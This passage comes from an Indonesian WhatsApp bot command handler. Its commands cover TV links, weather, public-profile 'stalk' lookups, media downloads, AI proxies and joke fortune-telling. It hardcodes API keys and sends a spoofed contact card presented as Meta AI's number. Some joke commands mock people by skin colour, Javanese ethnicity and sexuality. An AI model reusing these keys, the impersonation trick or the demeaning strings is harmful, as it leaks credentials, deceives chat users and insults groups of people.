      let caption = ` *Title:* ${titleRomaji} (${titleNative})
 *Episode:* ${episode}
 *Similarity:* ${(similarity * 100).toFixed(2)}%
 *At:* ${at}`;
      znn.sendMessage(m.chat, { image: { url: anu }, caption: caption },{quoted:fpayment2})
    } catch (e) {
      console.log(e);
       reply(' Error!')
    }
  } else {
    reply('Please reply to the image')
  }
}
break
//Channel-nya
case "tvinternasional":
{
let teksb = `📺SALURAN TELEVISI GELOMBANG DUNIA📺`
let channel = `https://photocall.tv/`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "globaltv": case "gtv":
{

let teksz = `📺SALURAN TELEVISI GLOBAL TV📺`
let channel = `https://m.rctiplus.com/tv/globaltv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksz}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksz,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: true
}
}}, {quoted: m})
}
break
case "rcti":
{



let teksy = `📺SALURAN TELEVISI RCTI📺`
let channel = `https://m.rctiplus.com/tv/rcti`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksy}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksy,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "mnctv":
{
let teksuu = `📺SALURAN TELEVISI MNCTV📺`
let channel = `https://m.rctiplus.com/tv/mnctv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksuu}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksuu,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break
case "transtv":
{

let teksbn = `📺SALURAN TELEVISI TRANS TV📺`
let channel = `https://www.transtv.co.id/live`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksbn}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksbn,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break

case "trans7":
{

let tekshb = `📺SALURAN TELEVISI TRANS 7📺`
let channel = `https://www.transtv.co.id/live/trans7`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${tekshb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekshb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "antv":
{
let tekshbb = `📺SALURAN TELEVISI ANTV📺`
let channel = `https://m.vidio.com/live/782-antv`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${tekshbb}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekshbb,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "sctv":
{

let teksknn = `📺SALURAN TELEVISI SCTV📺`
let channel = `https://m.vidio.com/live/204`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksknn}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksknn,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "nettv": case "net":
{
let teksim = `📺SALURAN TELEVISI NET TV📺`
let channel = `https://www.netmedia.co.id/live-streaming`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${teksim}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: teksim,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case "indosiar":
{

let tekskop = `📺SALURAN TELEVISI INDOSIAR📺`
let channel = `https://m.vidio.com/live/205`
let teksnya = `Ketuk Thumnile Bertuliskan Play Untuk Memulai!`
let titel = `⇆ㅤ ||◁ㅤ▶️ㅤ▷||ㅤ ↻`
let desk = `Click Here To Play!`

znn.sendMessage(m.chat, {text: `${tekskop}\n\n${teksnya}`, contextInfo:{ 
externalAdReply: {
showAdAttribution: true,
mediaType:  1,
title: titel, 
body: desk, 
description: tekskop,
sourceUrl: channel,
thumbnail: global.thumb,
previewType: 'PHOTO',
renderLargerThumbnail: false
}
}}, {quoted: m})
}
break // Powered By Winn
case 'ebinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
reply795(eb)
}
break
case 'dbinary': {
if (!q) return reply(`reply code *binary* dengan caption ${prefix + command}`)
let { dBinary } = require('./lib/binary')
let db = await dBinary(quoted.text)
reply795('*Result :*'+db)
}
break
case 'ringtone': {
if (!text) return reply(`Example : ${prefix + command} black rover`)
let ringtone = require('./lib/sekref')
let anutone2 = await ringtone(text)
let result = anutone2[Math.floor(Math.random() * anutone2.length)]
znn.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
case 'cekcuaca': case 'weather':{
if (!text) return reply('lokasinya dimana?')
let wdata = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
);
let textw = ""
textw += `*🗺️Weather of• {text}*\n\n`
textw += `*Weather :* ${wdata.data.weather[0].main}\n`
textw += `*Description :* ${wdata.data.weather[0].description}\n`
textw += `*Avg Temp :* ${wdata.data.main.temp}\n`
textw += `*Feels Like :* ${wdata.data.main.feels_like}\n`
textw += `*Pressure :* ${wdata.data.main.pressure}\n`
textw += `*Humidity :* ${wdata.data.main.humidity}\n`
textw += `*Humidity :* ${wdata.data.wind.speed}\n`
textw += `*Latitude :* ${wdata.data.coord.lat}\n`
textw += `*Longitude :* ${wdata.data.coord.lon}\n`
textw += `*Country :* ${wdata.data.sys.country}\n`

znn.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: `${wdata.data.coord.lat}`,
degreesLongitude: `${wdata.data.coord.lon}`,
name: text,
url: "https://foursquare.com/v/520dceb911d2dac1f713434a",
caption: textw,
sequenceNumber: 1709322015967001, timeOffset: Date.now(), jpegThumbnail: ppnyauser,
}
}, { quoted: fkontak2 })
}
break

case 'tiktokstalk': {
	  if (!text) return reply(`Username? `)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *TIKTOK STALK* 
  *Number:* ${res.name}
  *Username:* ${res.username}
  *followers:* ${res.followers}
  *following:* ${res.following}
  *Desc:* ${res.desc}

  *Link* : https://tiktok.com/${res.username}
└────────────`
  await znn.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m})
}
break
case 'igstalk': {
if (!args[0]) return reply795(`Enter Instagram Username\n\nExample : ${prefix + command} bg.dalwin`)
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
  *Name :* ${res.name} 
  *Username :* ${res.username}
  *Follower :* ${res.followersH}
  *Following :* ${res.followingH}
  *Bio :* ${res.description}
  *Posts :* ${res.postsH}
  *Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await znn.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } catch {
        reply(`lihat username yang valid di *Instagram*`)
      }
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return reply(`Example ${prefix+command} znn`)
let githubstalk = require('./lib/sekref')
aj = await githubstalk.githubstalk(`${q}`)
znn.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*GITHUB STALK*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} hercai`)
let npmstalk = require('./lib/sekref')
eha = await npmstalk.npmstalk(q)
reply795(`*NPM STALK*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Publish Time : ${eha.publishTime}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'distance': case 'jarak':{
if (!text) return reply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
reply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return reply(` Example : ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return znn.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else reply795(data.desc)
}
break
case 'spotify':
if (!text) return reply('Masukan judul lagu!') 
let searching = require('./lib/spotify')
searching(text).then(result => {
const hasil = `乂 *S P O T I F Y*

*Title*: ${result.data[0].title}
*Duration*: ${result.data[0].duration}
*Popular*: ${result.data[0].popularity}
*Url*: ${result.data[0].url}
`
znn.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": 'znn Spotify',
"body": `${result.data[0].url}`,
"showAdAttribution": false,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/d888041549c7444f1212b.jpg',
"renderLargerThumbnail": true

}
}}, {quoted: floc})
					
const spoDl = `https://spotifyku.my.id/download?url=${result.data[0].url}`
znn.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `znn Spotify`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/d888041549c7444f1212b.jpg',
sourceUrl: `${global.saluran}`,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
});
   })
break 
case 'spotifysearch':{
if (!text) return reply(`Contoh : ${prefix + command} dandelion`);
  
let spotify = await fetch(`https://api.nomisec07.site/api/spotify-search?text=${text}`);
  let json = await spotify.json();
  
let hasil = json.data.map((v) => `*Title:* ${v.title}\n*Popularitas:* ${v.popularity}\n*Url:* ${v.url}`).join('\n\n_____________________________________\n\n');
  
let vid = 'https://telegra.ph/file/1777e972a6ea790afebfc.mp4'
znn.sendFile(m.chat, vid, 'pp.mp4', hasil, m, true, { 
 gifPlayback: true, gifAttribution: 2})
}
break;
case 'ss': case 'ssweb': {
if (!q) return reply(`Example ${prefix+command} link`)
let krt = await scp2.ssweb(q)
znn.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'ghstalk':
if (!text) return reply('Harap Masukan Username')
reply('Searching...')
    let nya = await fetch(`https://api.github.com/users/${text}`).then(a => a.json())
    let thumb = await getBuffer(nya.avatar_url)
    let hasil = `*── 「 GITHUB STALK 」 ──*
➸ *Bio*: ${nya.bio}
➸ *Perusahaan*: ${nya.company}
➸ *Repo Publik:* ${nya.public_repos}
➸ *Gists Publik:* ${nya.public_gists}
➸ *Follower:* ${nya.followers}
➸ *Following:* ${nya.following}
➸ *Lokasi:* ${nya.location}
➸ *Link:* ${nya.html_url}
`
znn.sendMessage(m.chat, { image: thumb, caption: hasil, quoted: m })
break
case 'openai': case 'chatgpt': case 'ai':{
if (!text) return reply('Enter questions!')
const { askGPT, GptGo } = require('./lib/gpt_bot');
const chats = await askGPT(text);    
reply795('`'+chats.result+'`')
}
break
case 'bing-img': case 'bingimg':
case 'bingimage':{
if (!text) return reply(`Example: .${command} highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed`)
let anu = `https://aemt.me/bingimg?text=${text}`
await znn.sendMessage(m.chat, {image: {url:anu}, caption: `*< Success >*\n\n*Prompt :* ${text}`},{quoted: fpayment2})
}
break //Powered By znn & znn
case 'textimg': case 'txt2img':{
if (!text) return reply('Example: .txt2img highly detailed, intricate, 4k, 8k, sharp focus, detailed hair, detailed')
let anu = `https://aemt.me/ai/text2img?text=${text}`
await znn.sendMessage(m.chat, {image: {url:anu}, caption: `*< Success >*\n\n*Prompt :* ${text}`},{quoted: fpayment2})
}
break //Powered By znn & znn
case 'lirik':
if (!text) return reply('judulnya apa?')
var { data } = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=haikalgans&query=${text}`)
reply(data.result)
break
case 'stalktiktok':
if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
var caption = `Username : ${data.result.username}\n`
caption += `Nickname : ${data.result.nickname}\n`
caption += `Followers : ${data.result.followers}\n`
caption += `Followings : ${data.result.followings}\n`
caption += `Likes : ${data.result.likes}\n`
caption += `Video : ${data.result.video}\n`
caption += `Bio : ${data.result.bio}\n`
znn.sendMessage(from, { image: { url: data.result.user_picture }, caption })
})
break
case 'yts': case 'ytsearch': {
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\nResult From '+text+'\nketik *getmusic* untuk mengambil mp3 dan *getvideo* untuk mp4\ngunakan dengan nomor urutan, contoh *getmusic 1*\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No Urutan : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n─────────────────\n`
}
znn.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break
case 'getmusic': {
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
downloadMp3(urls[text - 1])
}
break
case 'getvideo': 
if (!text) throw `Example : ${prefix + command} 1`
if (!m.quoted) return m.reply('Reply Pesan')
if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
const znnvidoh2 = require('./lib/ytdl2')
let quality = args[1] ? args[1] : '360p'
const vid2=await znnvidoh2.mp4(urls[text - 1], quality)
const ytc2=`*Tittle:* ${vid2.title}
*Date:* ${vid2.date}
*Duration:* ${vid2.duration}
*Quality:* ${vid2.quality}`
await znn.sendMessage(m.chat,{
    video: {url:vid2.videoUrl},
    caption: ytc2
},)
break
case "ytreels": case "youtubereels":{
if (!text) return m.reply('Masukan Link Nya!!!')
downloadMp4(text)
}
break
case 'pinterest': case 'pin':
if (args.length < 2) return reply(`Kirim perintah ${command} query atau ${command} query -jumlah\nContoh :\n${command} cecan atau ${command} cecan -10`)
reply('_Tunggu sebentar..._')
var jumlah;
if (q.includes('-')) jumlah = q.split('-')[1]
pinterest(q.replace('-'+jumlah, '')).then(async(data) => {
if (q.includes('-')) {
if (data.result.length < jumlah) {
  jumlah = data.result.length
  reply(`Result ${data.result.length} gambar, gambar segera dikirim`)
}
for (let i = 0; i < jumlah; i++) {
  znn.sendMessage(from, { image: { url: data.result[i] }, caption: `_Hasil pencarian ${q}_`})
}

} else { 
znn.sendMessage(from, { caption: `Ini dia ${q}`, image: { url: pickRandom(data.result) }}, { quoted: m })

}
})
break
case 'metaai':
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `Powered By znn`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:znn;Bot;;;\nFN:znn Bot\nTEL;type=Mobile;waid=13135550002:+62 838-9738-7848\nEND:VCARD",
}
}), { userJid: m.chat, quoted: fpayment2 })
znn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break










































// FITUR PRIMBON
case 'apakah': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break
case 'rate': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'jomokcek': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gans = ['10% hitam','2% j*wa','h*tam banget wak bjir 😂','jomok ansing jangan di temenin','wah wah sang makhluk h*tam datang','buset wak j*wir 😂','orang suci 🧘🏾‍♂️','j*wa njir 👉🏽💩👈🏽','sang raja h*tam telah datang, mohon tundukan kepala']
const tengs = gans[Math.floor(Math.random() * gans.length)]
reply(`Si ${q} *${tengs}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break
case 'wangy': {
if (!isGroup) return onlyGroup()
if (!q) return reply(`Contoh : ${prefix}wangy HuBotZ`)
let qq = q.toUpperCase()
let awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
reply(awikwok)
}
break

//menu primbon
case 'artimimpi': case 'tafsirmimpi': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} belanja`
 let anu = await primbon.tafsir_mimpi(text)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
}
break
//=================================================//
case 'ramalanjodoh': case 'ramaljodoh': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} yunzhie, 7, 7, 2024, znn, 16, 11, 2024`
 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'artinama': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} znn`
 let anu = await primbon.arti_nama(text)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'kecocokannama': case 'cocoknama': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} Aruna, 7, 7, 2005`
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
}
break
//=================================================//
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} znn|YunYun`
 let [nama1, nama2] = text.split`|`
 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
 if (anu.status == false) return reply(anu.message)
 znn.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
case 'jadianpernikahan': case 'jadiannikah': {
if (!isGroup) return onlyGroup()
 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
 if (anu.status == false) return reply(anu.message)
 znn.sendteks(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
}
break
//=================================================//
case 'sifatusaha': {
if (!isGroup) return onlyGroup()
 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
